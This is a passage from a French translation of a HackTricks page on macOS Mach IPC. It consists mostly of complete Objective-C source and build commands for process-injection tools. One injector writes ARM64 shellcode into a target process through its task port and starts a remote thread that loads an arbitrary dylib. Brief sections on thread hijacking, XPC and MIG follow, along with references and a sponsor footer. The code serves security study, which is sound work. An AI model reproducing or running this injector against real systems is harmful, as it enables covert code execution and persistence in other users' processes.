kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Injection de dylib dans un thread via le port de tâche

Sur macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant l'API **posix `pthread`**. Le thread que nous avons généré dans l'injection précédente a été généré en utilisant l'API Mach, donc **il n'est pas conforme à posix**.

Il était possible d'**injecter un simple shellcode** pour exécuter une commande car cela **n'avait pas besoin de fonctionner avec des APIs conformes à posix**, seulement avec Mach. Les **injections plus complexes** nécessiteraient que le **thread** soit également **conforme à posix**.

Par conséquent, pour **améliorer le thread**, il devrait appeler **`pthread_create_from_mach_thread`** qui va **créer un pthread valide**. Ensuite, ce nouveau pthread pourrait **appeler dlopen** pour **charger une dylib** du système, donc au lieu d'écrire un nouveau shellcode pour effectuer différentes actions, il est possible de charger des bibliothèques personnalisées.

Vous pouvez trouver des **dylibs d'exemple** dans (par exemple celui qui génère un journal que vous pouvez ensuite écouter) :

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossible de définir les autorisations de mémoire pour le code du thread distant : Erreur %s\n", mach_error_string(kr));
return (-4);
}

// Définir les autorisations sur la mémoire de la pile allouée
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossible de définir les autorisations de mémoire pour la pile du thread distant : Erreur %s\n", mach_error_string(kr));
return (-4);
}


// Créer un thread pour exécuter le shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // c'est la vraie pile
//remoteStack64 -= 8;  // besoin d'un alignement de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pile distante 64  0x%llx, Le code distant est %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Impossible de créer un thread distant : erreur %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Utilisation : %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_ : chemin vers un dylib sur le disque\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib non trouvé\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Détournement de thread via le port de tâche <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Dans cette technique, un thread du processus est détourné :

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informations de base

XPC, qui signifie XNU (le noyau utilisé par macOS) Inter-Process Communication, est un framework pour la **communication entre les processus** sur macOS et iOS. XPC fournit un mécanisme pour effectuer des **appels de méthode sûrs et asynchrones entre différents processus** sur le système. Il fait partie du paradigme de sécurité d'Apple, permettant la **création d'applications à privilèges séparés** où chaque **composant** s'exécute avec **seulement les autorisations nécessaires** pour effectuer son travail, limitant ainsi les dommages potentiels d'un processus compromis.

Pour plus d'informations sur le fonctionnement de cette **communication** et sur la façon dont elle **pourrait être vulnérable**, consultez :

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Générateur d'interface Mach

MIG a été créé pour **simplifier le processus de création de code Mach IPC**. Cela est dû au fait qu'une grande partie du travail pour programmer RPC implique les mêmes actions (empaqueter les arguments, envoyer le message, déballer les données dans le serveur...).

MIC génère essentiellement le code nécessaire pour que le serveur et le client communiquent avec une définition donnée (en IDL - Interface Definition Language -). Même si le code généré est moche, un développeur n'aura qu'à l'importer et son code sera beaucoup plus simple qu'auparavant.

Pour plus d'informations, consultez :

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Références

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
